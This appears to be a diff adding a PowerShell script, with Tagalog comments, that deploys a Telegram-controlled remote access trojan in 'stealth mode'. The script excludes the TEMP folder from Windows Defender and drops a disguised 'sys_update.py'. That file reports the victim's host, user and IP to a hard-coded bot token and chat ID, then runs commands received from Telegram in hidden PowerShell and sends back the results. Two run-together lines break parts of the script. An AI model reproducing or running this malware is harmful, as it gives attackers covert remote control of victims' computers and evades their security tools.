@@ -1,0 +1,151 @@
+# =====================================================================
+# COMPLETE ALL-IN-ONE TELEGRAM RAT DEPLOYMENT SCRIPT (STEALTH MODE)
+# =====================================================================
+
+Write-Host "[*] Sinisimulan ang proseso ng pag-setup (Stealth Mode)..." -ForegroundColor Cyan
+
+# 1. Whitelist TEMP folder
+$tempFolder = [System.IO.Path]::GetTempPath()
+try {
+    Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop
+    Write-Host "[+] Na-whitelist ang TEMP folder." -ForegroundColor Green
+} catch {
+    Write-Host "[!] Paalala sa Whitelist (Maaaring hindi Administrator)." -ForegroundColor Yellow
+}
+
+# 2. Check / Install Python
+if (-not (Get-Command "python" -ErrorAction SilentlyContinue)) {
+    Write-Host "[*] Dina-download ang Python..." -ForegroundColor Yellow
+    $pyUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
+    $pyPath = "$env:TEMP\py_installer.exe"
+    Invoke-WebRequest -Uri $pyUrl -OutFile$pyPath
+    Start-Process -FilePath $pyPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+    Remove-Item $pyPath -Force$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+}
+
+# 3. Install requests at pynput libraries
+Write-Host "[*] Ina-update ang pip at ini-install ang mga kinakailangang libraries (requests, pynput)..." -ForegroundColor Cyan
+python -m pip install --upgrade pip requests pynput | Out-Null
+
+# 4. Gumawa ng Python file na may Stealth Subprocess Execution (Walang pop-up window)
+$clientPath = "$env:TEMP\sys_update.py"
+
+$pythonCode = @"
+import os
+import subprocess
+import requests
+import time
+import socket
+import platform
+
+TOKEN = "7458211664:AAGQ4V4Q2iJwGrxuNtnGbZKMaKrYCMgUHXk"
+URL = f"https://api.telegram.org/bot{TOKEN}/"
+ADMIN_CHAT_ID = "5620004341"
+
+pc_name = socket.gethostname().strip()
+user_name = os.getlogin()
+os_info = platform.system() + " " + platform.release()
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip_address = s.getsockname()[0]
+    s.close()
+except:
+    ip_address = "Unknown"
+
+def send_message(chat_id, text):
+    try:
+        if len(text) > 4096:
+            text = text[:4093] + "..."
+        params = {'chat_id': chat_id, 'text': text}
+        requests.post(URL + 'sendMessage', json=params, timeout=10)
+    except:
+        pass
+
+def notify_online_status(chat_id):
+    startup_msg = (
+        f"🟢 **NEW TARGET ONLINE / CHECK-IN** 🟢\n"
+        f"----------------------------------------\n"
+        f"💻 **PC Name:** `{pc_name}`\n"
+        f"👤 **User:** {user_name}\n"
+        f"🪟 **OS:** {os_info}\n"
+        f"🌐 **IP Address:** {ip_address}\n"
+        f"----------------------------------------\n"
+        f"Paggamit: `{pc_name}: <command>` o `all: <command>`"
+    )
+    send_message(chat_id, startup_msg)
+
+def get_updates(offset=None):
+    try:
+        params = {'timeout': 30, 'offset': offset}
+        response = requests.get(URL + 'getUpdates', params=params, timeout=35)
+        return response.json()
+    except:
+        return None
+
+def main():
+    offset = None
+    notify_online_status(ADMIN_CHAT_ID)
+
+    while True:
+        updates = get_updates(offset)
+        if updates and 'result' in updates:
+            for update in updates['result']:
+                offset = update['update_id'] + 1
+                if 'message' in update and 'text' in update['message']:
+                    chat_id = update['message']['chat']['id']
+                    full_command = update['message']['text'].strip()
+                    
+                    if ":" in full_command:
+                        target_pc, actual_command = full_command.split(":", 1)
+                        target_pc = target_pc.strip()
+                        actual_command = actual_command.strip()
+                        
+                        if target_pc.lower() != pc_name.lower() and target_pc.lower() != "all":
+                            continue
+                    else:
+                        continue
+                    
+                    if actual_command.lower() == '/exit':
+                        send_message(chat_id, f"[{pc_name}] Shutting down client...")
+                        return
+
+                    try:
+                        # Setup Hidden StartupInfo para walang lumitaw na terminal window sa screen
+                        si = subprocess.STARTUPINFO()
+                        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                        si.wShowWindow = 0  # SW_HIDE (Itago ang bintana)
+
+                        result = subprocess.run(
+                            ["powershell.exe", "-WindowStyle", "Hidden", "-Command", actual_command],
+                            capture_output=True,
+                            text=True,
+                            timeout=60,
+                            startupinfo=si
+                        )
+                        output = result.stdout if result.stdout else result.stderr
+                        if not output.strip():
+                            output = "Command executed successfully with no output."
+                    except Exception as e:
+                        output = f"Execution Error: {str(e)}"
+                    
+                    final_reply = f"[{pc_name} ({user_name})]:\n{output}"
+                    send_message(chat_id, final_reply)
+                    
+        time.sleep(2)
+
+if __name__ == '__main__':
+    main()
+"@
+
+# Linisin muna ang mga lumang background Python instances para walang conflict
+Stop-Process -Name "pythonw", "python" -Force -ErrorAction SilentlyContinue
+
+# Isulat ang updated code gamit ang .NET
+[System.IO.File]::WriteAllText($clientPath,$pythonCode, [System.Text.Encoding]::UTF8)
+
+# 5. Patakbuhin ang bagong stealth instance sa background
+Start-Process -FilePath "pythonw.exe" -ArgumentList "`"$clientPath`"" -WindowStyle Hidden
+
+Write-Host "[SUCCESS] Na-update na ang script sa Stealth Mode, nalinis ang mga lumang proseso, at tumatakbo na nang tahimik!" -ForegroundColor Cyan
